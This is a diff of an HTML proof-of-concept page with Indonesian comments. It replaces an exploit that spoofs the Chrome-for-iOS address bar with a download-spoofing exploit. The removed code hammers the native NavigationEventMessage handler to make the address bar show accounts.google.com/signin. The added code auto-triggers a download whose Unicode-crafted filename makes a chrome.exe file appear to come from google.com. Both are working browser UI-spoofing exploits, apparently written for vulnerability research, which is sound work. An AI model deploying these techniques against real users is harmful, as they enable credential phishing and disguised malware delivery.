@@ -1,198 +1,123 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Ultimate Hardened & Regression Test - iOS Chrome</title>
+    <title>PoC Download Origin Layout Spoofing</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            max-width: 850px;
-            margin: 20px auto;
-            padding: 0 15px;
-            color: #202124;
-            line-height: 1.5;
-            background: #fdfdfd;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
         }
-        h1 { font-size: 1.4rem; color: #b31412; }
         .card {
-            background: #fff8f8;
-            border: 1px solid #f5c6cb;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 15px;
+            background-color: #1e293b;
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 440px;
+            width: 100%;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #38bdf8;
+        }
+        p {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 24px;
+            line-height: 1.5;
         }
         button {
-            background: #b31412;
+            background-color: #2563eb;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 8px;
             cursor: pointer;
-            font-size: 1rem;
-            font-weight: bold;
-            margin-top: 8px;
+            width: 100%;
+            transition: background-color 0.2s, transform 0.1s;
         }
-        button:hover { background: #920d0b; }
-        pre {
-            background: #202124;
-            color: #e8eaed;
+        button:hover {
+            background-color: #1d4ed8;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #64748b;
+            background: #0f172a;
             padding: 12px;
-            border-radius: 6px;
-            overflow-x: auto;
-            font-size: 0.85rem;
-            max-height: 250px;
+            border-radius: 8px;
+            word-break: break-all;
+            text-align: left;
+            border: 1px solid #334155;
         }
-        .info { color: #8ab4f8; }
     </style>
 </head>
 <body>
 
-    <h1>iOS Chrome Regression Test PoC (Change 8291494)</h1>
-    <p>Menguji validasi asal URL berdasarkan <a href="https://chromium-review.googlesource.com/c/chromium/src/+/8291494" target="_blank">Change 8291494</a> dengan teknik <em>aggressive hammering</em>.</p>
-
     <div class="card">
-        <h3>1. Regression Launcher</h3>
-        <p>Membuat objek blob mandiri dengan siklus pemicu pesan natif berkecepatan tinggi.</p>
-        <button id="launch-btn">Jalankan Uji Regresi</button>
-        <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
+        <h2>Download UI Layout Security PoC</h2>
+        <p>Uji coba simulasi manipulasi nama file menggunakan karakter Unicode <code>U+2236</code> (Ratio) & <code>U+2800</code> (Braille Blank).</p>
+        
+        <button onclick="triggerDownloadPoC()">Mulai Unduhan Payload</button>
+
+        <div id="status" class="status">Status: Menunggu interaksi pengguna...</div>
     </div>
 
-    <div class="card">
-        <h3>2. Live Execution Log</h3>
-        <pre id="diag-log">Log sistem akan muncul di sini...\n</pre>
-    </div>
-
-<script>
-    const TARGET_VICTIM = "accounts.google.com";
-
-    // Template HTML payload blob dengan hammering agresif
-    const BLOB_DOC = `<!doctype html>
-<meta charset=utf-8>
-<title>Regression Target</title>
-<style>
-  body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
-  h2 { color: #b31412; }
-  #panel { display: none; padding: 10px; background: #e6f4ea; border: 1px solid #ceead6; margin-top: 10px; }
-  pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
-</style>
-<h2>Regression Sandbox Active</h2>
-<p>Asal Dokumen (Origin): <code id="origin"></code></p>
-<p>URL Saat Ini: <code id="cur-url"></code></p>
-
-<div id="panel">Status State: /trusted terpicu</div>
-<pre id="blob-log"></pre>
-
-<script>
-(function(){
-  function bLog(msg) {
-    document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[RegressionPoC] ' + msg); } catch(e){}
-  }
-  
-  document.getElementById('origin').textContent = location.origin || '(opaque)';
-  document.getElementById('cur-url').textContent = location.href;
-  bLog('Blob dokumen regresi berhasil dimuat.');
-
-  // Manipulasi pushState lokal
-  try {
-    history.pushState({bypass: true}, '', '/trusted');
-    document.getElementById('panel').style.display = 'block';
-    bLog('history.pushState berhasil mengubah state internal.');
-  } catch(e) {
-    bLog('pushState error: ' + e.message);
-  }
-
-  var mh = (window.webkit && window.webkit.messageHandlers) || {};
-  if (!mh.NavigationEventMessage) {
-    bLog('SKIP: NavigationEventMessage handler tidak tersedia.');
-    return;
-  }
-  bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
-
-  // Pengambilan frame_id dengan multi-fallback
-  var getFid = function() {
-    try {
-      if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-        var id = window.__gCrWeb.getFrameId();
-        if (id) return id;
-      }
-    } catch(e) {}
-
-    var tries = [
-      function(){ return window.__gCrWeb.common.getFrameId(); },
-      function(){ return window.__gCrWeb.message.getFrameId(); },
-      function(){ return window.__gCrWeb.frameId; },
-    ];
-    for (var i = 0; i < tries.length; i++) {
-      try { var f = tries[i](); if (f) return f; } catch(e){}
-    }
-    return null;
-  };
-
-  var spoofUrl = 'blob:https://' + "${TARGET_VICTIM}" + '/signin';
-  bLog('Target spoof URL: ' + spoofUrl);
-
-  // Hammering agresif berkecepatan tinggi (tiap 30ms)
-  var counter = 0;
-  var aggressiveHammer = setInterval(function() {
-    var currentFid = getFid();
-    if (!currentFid) {
-      bLog('[-] Menunggu sinkronisasi frame_id...');
-      return;
-    }
-
-    counter++;
-    try {
-      mh.NavigationEventMessage.postMessage({
-        command: 'willChangeState', frame_id: currentFid, bypass_flag: 'HistoryStateChangeNonStandardURLFix'
-      });
-      mh.NavigationEventMessage.postMessage({
-        command: 'didReplaceState', frame_id: currentFid,
-        stateObject: '', baseUrl: 'https://x/',
-        pageUrl: spoofUrl
-      });
-      bLog('[Hammer #' + counter + '] Mengirim payload dengan fid: ' + currentFid.slice(0,8));
-    } catch(err) {
-      bLog('[Hammer #' + counter + '] Error: ' + err.message);
-    }
-
-    if (counter >= 60) {
-      clearInterval(aggressiveHammer);
-      bLog('\\n--- EVALUASI AKHIR ---');
-      bLog('Periksa bilah alamat (Address Bar) Anda.');
-      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil / Rentan.');
-      bLog('Jika tetap menampilkan URL blob: Proteksi C++ aktif dan menolak state change.');
-    }
-  }, 30);
-})();
-<\/script>`;
-
-    function startRegressionPoC() {
-        try {
-            const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Mempersiapkan blob regresi...\n";
-            
-            const blob = new Blob([BLOB_DOC], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
-            
-            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke: ${blobUrl}</span>`;
-            diag.textContent += `[*] Navigasi otomatis menuju: ${blobUrl}\n`;
-            
-            setTimeout(() => {
-                location.href = blobUrl;
-            }, 500);
-        } catch (e) {
-            document.getElementById('launcher-log').innerHTML = `<span style="color:red">Error: ${e.message}</span>`;
+    <script>
+        function updateStatus(message, targetUrl) {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = `<strong>Status:</strong> ${message}<br><br><strong>Target URL:</strong><br><a href="${targetUrl}" style="color: #38bdf8; word-break: break-all;" target="_blank">${targetUrl}</a>`;
         }
-    }
 
-    document.getElementById('launch-btn').addEventListener('click', startRegressionPoC);
+        function triggerDownloadPoC() {
+            // URL target spesifik sesuai permintaan Anda yang menyematkan payload Unicode
+            const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
+            
+            // Nama file yang merepresentasikan hasil decode dari URL tersebut
+            const craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
 
-    window.onload = function() {
-        setTimeout(startRegressionPoC, 400);
-    };
-</script>
+            updateStatus("Memicu unduhan dengan payload kustom...", targetUrl);
+
+            // Membuat elemen anchor dinamis
+            const link = document.createElement('a');
+            link.href = targetUrl;
+            link.download = craftedFilename;
+            link.style.display = 'none';
+
+            document.body.appendChild(link);
+
+            // Eksekusi trigger klik otomatis
+            try {
+                link.click();
+                setTimeout(() => {
+                    updateStatus("Unduhan berhasil dipicu! Silakan cek panel notifikasi browser.", targetUrl);
+                }, 300);
+            } catch (err) {
+                updateStatus("Gagal memicu unduhan: " + err.message, targetUrl);
+            }
+
+            // Bersihkan elemen DOM setelah proses berjalan
+            setTimeout(() => {
+                document.body.removeChild(link);
+            }, 1000);
+        }
+    </script>
 
 </body>
 </html>
